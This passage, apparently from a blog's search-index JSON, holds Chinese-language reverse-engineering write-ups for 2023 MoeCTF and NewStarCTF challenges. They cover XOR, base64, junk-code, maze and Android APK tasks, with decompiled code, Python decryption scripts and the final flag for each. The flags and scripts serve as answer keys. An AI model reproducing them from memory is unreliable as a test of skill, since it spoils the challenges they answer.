v4[27] + 387 * v4[26] + 114 * v4[25] + 303 * v4[24] + 248 * v4[23] + 258 * v4[21] + 218 * v4[20] + 180 * v4[19] + 196 * v4[18] + 398 * v4[17] + 398 * v4[14] + 138 * v4[9] + 292 * v4[8] + 38 * v4[7] + 179 * v4[6] + 190 * v4[5] + 57 * v4[4] + 358 * v4[3] + 191 * v4[2] + 215 * v4[1] + 88 * v4[0] + 22 * v4[10] + 72 * v4[11] + 357 * v4[12] + 9 * v4[13] + 389 * v4[15] + 81 * v4[16] + 85 * v4[30] != 529847 || 311 * v4[29] + 202 * v4[28] + 234 * v4[27] + 272 * v4[26] + 55 * v4[25] + 328 * v4[24] + 246 * v4[23] + 362 * v4[22] + 86 * v4[21] + 75 * v4[20] + 142 * v4[17] + 244 * v4[16] + 216 * v4[15] + 281 * v4[14] + 398 * v4[13] + 322 * v4[12] + 251 * v4[11] + 357 *","date":"2024-05-05","objectID":"/posts/54f90da/:8:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r9 junk_code junk_code.exe 这道题考的是花指令混淆的对抗，程序的主要代码如下 int __cdecl main_0(int argc, const char **argv, const char **envp) { char Str[18]; // [esp+E8h] [ebp-30h] BYREF _BYTE v5[26]; // [esp+FAh] [ebp-1Eh] BYREF __CheckForDebuggerJustMyCode(\u0026unk_543007); j__puts(\"welcome to moectf\\nyour flag:\"); v5[18] = 0; sub_4591AE(\"%36s\", Str); if ( j__strlen(Str) \u003e\u003e 1 == 18 ) { if ( sub_45A9A0(Str, 18) \u0026\u0026 sub_459EBF(v5, 18) ) j__puts(\"congratulations!!!\"); else j__puts(\"WORNG!\"); return 0; } else { j__puts(\"WORNG!\"); return 0; } }分析后可得知，函数 sub_45A9A0 和函数 sub_459EBF 是判断对错的关键，所以猜测 flag 长度是 18*2=36 ，通过两个函数中的运算得到各自的一半 进入函数发现无法编译，应该就是在这对抗花指令 看汇编发现，最后的 jz 跳转是无效的，而 loc_460612 函数处的内容，也是无效的，所以取消定义U ，并将内容改为 nop ,最后回到原函数 sub_45A9A0 处，重新识别为函数即可正常编译 得到伪代码 int __cdecl sub_4605D0(char *a1, int a2) { char v3; // [esp+D3h] [ebp-3Dh] int i; // [esp+DCh] [ebp-34h] int j; // [esp+DCh] [ebp-34h] int k; // [esp+DCh] [ebp-34h] int v7[4]; // [esp+F4h] [ebp-1Ch] BYREF __int16 v8; // [esp+104h] [ebp-Ch] memset(v7, 0, sizeof(v7)); v8 = 0; for ( i = 0; i \u003c a2; ++i ) { v3 = *a1++; *((_BYTE *)v7 + i) = v3; } for ( j = 0; j \u003c a2; ++j ) *((_BYTE *)v7 + j) -= 5; for ( k = 0; k \u003c a2; ++k ) { if ( aHjOavtPzmHQ[k] != *((_BYTE *)v7 + k) ) return 0; } return 1; }而第二个函数 sub_459EBF 的操作过程同理，最后得到如下伪代码 BOOL __cdecl sub_460750(char *Str2, signed int MaxCount) { signed int i; // [esp+D4h] [ebp-8h] for ( i = 0; i \u003c MaxCount; ++i ) Str2[i] ^= 0x66u; return j__strncmp(Str1, Str2, MaxCount) == 0; }分析后，最后的解密代码如下 enc1 = \"hj`^oavt+pZm`h+q._\" enc2 = \"39 12 0E 55 39 0C 13 08 0D 39 05 56 02 55 47 47 47 1B\".split(\" \") for i in enc1: print(chr(ord(i) + 5),end=''); for i in enc2: print(chr(int(i,16) ^ 0x66),end='');运行后即可得到 flag moectf{y0u_rem0v3d_th3_junk_c0d3!!!}","date":"2024-05-05","objectID":"/posts/54f90da/:9:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r10 ezandroid ezandroid.apk 使用 jadx 工具反编译 apk ，在 com.doctor3.ezandroid 中的 MainActivity 方法，内有一个外部库的引入 public native int check(String str); static { System.loadLibrary(\"ezandroid\"); }同时还申明了 navtive 函数 check 主要代码如下 btn.setOnClickListener(new View.OnClickListener() { // from class: com.doctor3.ezandroid.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { String s = input.getText().toString(); if (s.length() != 23) { Toast.makeText(MainActivity.this.getApplicationContext(), \"长度不对哦\", 0).show(); } else if (MainActivity.this.check(s) == 1) { Context applicationContext = MainActivity.this.getApplicationContext(); Toast.makeText(applicationContext, \"OK!RIGHT,flag is moectf{\" + s + \"}\", 0).show(); } else { Toast.makeText(MainActivity.this.getApplicationContext(), \"Try to reverse the native lib!\", 0).show(); } } });可以看到大致逻辑，调用了 check 函数来判断 flag 是否正确，这个时候就要去看 ezandroid 这个引入的库是什么内容 使用 ida 分析 apk 中的 libezandroid.so 文件，发现有个 JNI_OnLoad 函数，应该就是注册 native 的入口，所以应该是动态注册，且规定了一串文本 ******************@**************.************...****#..*****.********.*****.****.....*****.****.*********......*********************** 且另外有个函数也调用了这串文本，代码如下 _BOOL8 __fastcall sub_E80(_BYTE *a1) { _BYTE *v1; // rax bool v3; // [rsp+Fh] [rbp-19h] char *v4; // [rsp+10h] [rbp-18h] _BOOL4 v6; // [rsp+24h] [rbp-4h] v4 = \u0026asc_3C30[18]; while ( 2 ) { v3 = 0; if ( *a1 ) v3 = *v4 != 42; if ( v3 ) { v1 = a1++; switch ( *v1 ) { case 'a': --v4; continue; case 'd': ++v4; continue; case 's': v4 += 15; continue; case 'w': v4 -= 15; continue; default: v6 = 0; break; } } else { v6 = *v4 == 35; } break; } return v6; }看到有 adsw 这些，并且上下是位移 15,左右是 1 ，可以猜测是迷宫题了，且是个 9*15 的迷宫 整理输出后的迷宫如下 *************** ***@*********** ***.*********** *...****#..**** *.********.**** *.****.....**** *.****.******** *......******** ***************走到 # 即可 moectf{ssaassssdddddwwwddddwwwa}","date":"2024-05-05","objectID":"/posts/54f90da/:10:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":null,"content":"\r信息\remail: C4skg@qq.com ","date":"2024-03-20","objectID":"/about/:0:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"'s friends","date":"2024-03-20","objectID":"/friends/","tags":null,"title":"友链","uri":"/friends/"},{"categories":["WP"],"content":"前段时间参加了NewStarCTF的比赛，赛制是每个礼拜上一周的新题。由于前段时间比较忙，所以没怎么看，现在空下来，来复现一下，同时提升自己的逆向能力 ","date":"2024-03-20","objectID":"/posts/89d59c3/:0:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r1 AndroXor使用 jadx 工具反编译 APK 文件，具体的代码包在 com.chick.androxor 中，且具体的加密代码如下 public String Xor(String str, String str2) { char[] cArr = {14, '\\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\\n', 2, '\\f', '\u003e', '(', '@', 11, '\\'', 'K', 'Y', 25, 'A', '\\r'}; char[] cArr2 = new char[str.length()]; String str3 = str.length() != 25 ? \"wrong!!!\" : \"you win!!!\"; for (int i = 0; i \u003c str.length(); i++) { char charAt = (char) (str.charAt(i) ^ str2.charAt(i % str2.length())); cArr2[i] = charAt; if (cArr[i] != charAt) { return \"wrong!!!\"; } } return str3; }但是他这里的输入，包含了明文的同时，还输入了一个 key 用于异或，所以找到哪里调用了这个 Xor 函数即可 在这个函数上右键查找用例，可以定位到调用该函数的具体位置，调用过程如下 Toast.makeText(mainActivity, mainActivity.Xor(obj, \"happyx3\"), 1).show();这里可以发现，key 就是这个 happyx3，所以解密脚本如下 flag = [14, '\\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\\n', 2, '\\f', '\u003e', '(', '@', 11, '\\'', 'K', 'Y', 25, 'A', '\\r'] key = 'happyx3' for i,v in enumerate(flag): if type(v) == str: v = ord(v) flag[i] = chr( v ^ ord(key[ i % len(key) ])) print(''.join(flag)) #flag{3z_And0r1d_X0r_x1x1}","date":"2024-03-20","objectID":"/posts/89d59c3/:1:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r2 easy_RE该题目有个 readme.txt，内容是 打开就有 使用 ida 打开该程序，定位到 main 函数，先看汇编，发现初始化的时候就赋值了明文的 flag 具体代码如下 v5[0] = 102; v5[1] = 108; v5[2] = 97; v5[3] = 103; v5[4] = 123; v5[5] = 119; v5[6] = 101; v5[7] = 49; v5[8] = 99; v5[9] = 48; v5[10] = 109; std::string::string(v7, \"e_to_rev3rse!!}\", \u0026v10);导出即可 flag{we1c0me_to_rev3rse!!}","date":"2024-03-20","objectID":"/posts/89d59c3/:2:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r3 ELF使用 ida 进行反编译后，就能得到主要代码 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // edx char *s1; // [rsp+0h] [rbp-20h] char *v6; // [rsp+8h] [rbp-18h] char *s; // [rsp+10h] [rbp-10h] s = (char *)malloc(0x64uLL); printf(\"Input flag: \"); fgets(s, 100, stdin); s[strcspn(s, \"\\n\")] = 0; v6 = (char *)encode(s); //第一次加密 v3 = strlen(v6); s1 = (char *)base64_encode(v6, v3); //第二次加密 if ( !strcmp(s1, \"VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t\") ) //加密后对比 puts(\"Correct\"); else puts(\"Wrong\"); free(v6); free(s1); free(s); return 0; }发现输入密文后进行了两次加密，一次是 encode(s)，第二次就是 base64_encode(v6,v3) 先看 base64_encode 函数 _BYTE *__fastcall base64_encode(__int64 a1, int a2) { int v3; // eax int v4; // eax int v5; // eax int v6; // eax int v7; // eax int v8; // eax int v9; // eax int v10; // eax int v11; // eax char v12[72]; // [rsp+10h] [rbp-70h] BYREF unsigned int v13; // [rsp+58h] [rbp-28h] int v14; // [rsp+5Ch] [rbp-24h] int v15; // [rsp+60h] [rbp-20h] int v16; // [rsp+64h] [rbp-1Ch] _BYTE *v17; // [rsp+68h] [rbp-18h] int v18; // [rsp+70h] [rbp-10h] int i; // [rsp+74h] [rbp-Ch] int v20; // [rsp+78h] [rbp-8h] int v21; // [rsp+7Ch] [rbp-4h] strcpy(v12, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"); v18 = 4 * ((a2 + 2) / 3); v17 = malloc(v18 + 1); if ( !v17 ) return 0LL; v21 = 0; v20 = 0; while ( v21 \u003c a2 ) { v3 = v21++; v16 = *(unsigned __int8 *)(v3 + a1); if ( v21 \u003e= a2 ) { v5 = 0; } else { v4 = v21++; v5 = *(unsigned __int8 *)(v4 + a1); } v15 = v5; if ( v21 \u003e= a2 ) { v7 = 0; } else { v6 = v21++; v7 = *(unsigned __int8 *)(v6 + a1); } v14 = v7; v13 = (v15 \u003c\u003c 8) + (v16 \u003c\u003c 16) + v7; v8 = v20++; v17[v8] = v12[(v13 \u003e\u003e 18) \u0026 0x3F]; v9 = v20++; v17[v9] = v12[(v13 \u003e\u003e 12) \u0026 0x3F]; v10 = v20++; v17[v10] = v12[(v13 \u003e\u003e 6) \u0026 0x3F]; v11 = v20++; v17[v11] = v12[v13 \u0026 0x3F]; } for ( i = 0; (3 - a2 % 3) % 3 \u003e i; ++i ) v17[v18 - 1 - i] = 61; v17[v18] = 0; return v17; }这里就是正常的 base64 加密函数实现过程，并未发现替换表的行为，而且给的明文表就是原表 接下来看 encode 函数的实现过程 _BYTE *__fastcall encode(const char *a1) { size_t v1; // rax int v2; // eax _BYTE *v4; // [rsp+20h] [rbp-20h] int i; // [rsp+28h] [rbp-18h] int v6; // [rsp+2Ch] [rbp-14h] v1 = strlen(a1); v4 = malloc(2 * v1 + 1); v6 = 0; for ( i = 0; i \u003c strlen(a1); ++i ) { v2 = v6++; v4[v2] = (a1[i] ^ 0x20) + 16; } v4[v6] = 0; return v4; }输入明文后，该函数体对密文进行了 异或后位移 操作 了解了加密过程，下面就是解密脚本 from base64 import b64decode flag = \"VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t\" flag = list(b64decode(flag.encode())) for i,v in enumerate(flag): v = chr((v - 16) ^ 0x20) flag[i] = v print(''.join(flag)) #flag{D0_4ou_7now_wha7_ELF_1s?}","date":"2024-03-20","objectID":"/posts/89d59c3/:3:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r4 Endian题目主要代码如下 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-3Ch] char *v5; // [rsp+8h] [rbp-38h] char v6[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); puts(\"please input your flag\"); __isoc99_scanf(\"%s\", v6); v5 = v6; for ( i = 0; i \u003c= 4; ++i ) { if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) ) { printf(\"wrong!\"); exit(0); } v5 += 4; } printf(\"you are right\"); return 0; }array 是存储 flag 的数字，但是是以小端序存储，每个空间存储了一段16进制，每个值都会去异或 0x12345678 ，解密脚本如下 flag = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819] for i,v in enumerate(flag): flag[i] = bytes.fromhex(hex(v ^ 0x12345678)[2:])[::-1].decode(); print(''.join(flag)) #flag{llittl_Endian_a} #结尾手动补上 `}` 即可","date":"2024-03-20","objectID":"/posts/89d59c3/:4:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r5 EzPE使用 file 命令无法识别文件，用 010editor 查看发现不是标准的 exe 文件格式，所以手动修复文件头 修复后成功识别，主要代码如下 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+2Ch] [rbp-4h] _main(argc, argv, envp); puts(\u0026draw); puts(\"Please enter your flag!\\n\"); scanf(\"%s\", input); for ( i = 0; i \u003c strlen(input) - 1; ++i ) input[i] ^= i ^ input[i + 1]; if ( !strcmp(input, data) ) puts(\"You Win!\"); else puts(\"You lose!\"); system(\"pause\"); return 0; }对明文逐个异或加密后，对比加密字符串 data ，所以提取 data 的内容后逐个异或即可，这里要注意的是解密的时候方向得从后往前，因为他异或的对象是未加密前的数据本身的后一位，这里最后一位数据是没被修改的 解密脚本如下 flag = [int(i,16) for i in \"0A 0C 04 1F 26 6C 43 2D 3C 0C 54 4C 24 25 11 06 05 3A 7C 51 38 1A 03 0D 01 36 1F 12 26 04 68 5D 3F 2D 37 2A 7D\".split(' ')] for i in range(len(flag) - 2,-1,-1): flag[i] ^= i ^ flag[i+1] print(bytearray(flag).decode()) #flag{Y0u_kn0w_what_1s_PE_File_F0rmat}","date":"2024-03-20","objectID":"/posts/89d59c3/:5:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r6 lazy_activtiy用 jadx 反编译，在包 com.droidlean.activity_travel 中有 FlagActivity 类，代码如下 public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.layout_2); final TextView textView = (TextView) findViewById(R.id.textView2); final EditText editText = (EditText) findViewById(R.id.editTextTextPersonName2); ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() { // from class: com.droidlearn.activity_travel.FlagActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { textView.setText(Integer.toString(FlagActivity.access$004(FlagActivity.this))); if (FlagActivity.this.cnt \u003e= 10000) { Toast.makeText(FlagActivity.this, editText.getText().toString(), 0).show(); } } }); }很明显，在页面创建的时候，会输出读取某个 editText 的内容并输出，但是这个页面并没有正常显示，被注释掉了，正常显示的是 MainActivity 的页面 在 AndroidManifest.xml 文件中可以发现这样一句 \u003cactivity android:name=\"com.droidlearn.activity_travel.FlagActivity\" android:exported=\"false\"/\u003e说明 FlagActivity 的页面被关闭了，但是输出的 flag 是通过读取页面上控件的值，所以我们直接所搜 flag{ 关键字即可 android:text=\"flag{Act1v1ty_!s_so00oo0o_Impor#an#}\"","date":"2024-03-20","objectID":"/posts/89d59c3/:6:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r7 Segments题目的文件名是 shift_f7 ，同时题目名是 Segments ，所以很明显了，用 ida 打开该文件，直接看 Segments 即可 根据语义输出即可 flag{You_ar3_g0od_at_f1nding_ELF_segments_name}","date":"2024-03-20","objectID":"/posts/89d59c3/:7:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r8 咳查该文件，发现用 UPX 加了壳，使用命令脱壳即可 upx -d ke.exe去壳后用 ida 查看该文件，主要代码如下 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned __int64 i; // r10 char *v4; // kr00_8 char Str1[96]; // [rsp+20h] [rbp-88h] BYREF int v7; // [rsp+80h] [rbp-28h] _main(); memset(Str1, 0, sizeof(Str1)); v7 = 0; Hello(); scanf(\"%s\", Str1); for ( i = 0i64; ; ++i ) { v4 = \u0026Str1[strlen(Str1)]; if ( i \u003e= v4 - Str1 ) break; ++Str1[i]; } if ( !strncmp(Str1, enc, v4 - Str1) ) puts(\"WOW!!\"); else puts(\"I believe you can do it!\"); system(\"pause\"); return 0; }加密过程是逐个加1，最后对比密文。解密脚本如下 flag = list(\"gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~\") for i,v in enumerate(flag): flag[i] = chr(ord(v)-1) print(''.join(flag)) #flag{C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1}","date":"2024-03-20","objectID":"/posts/89d59c3/:8:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"}]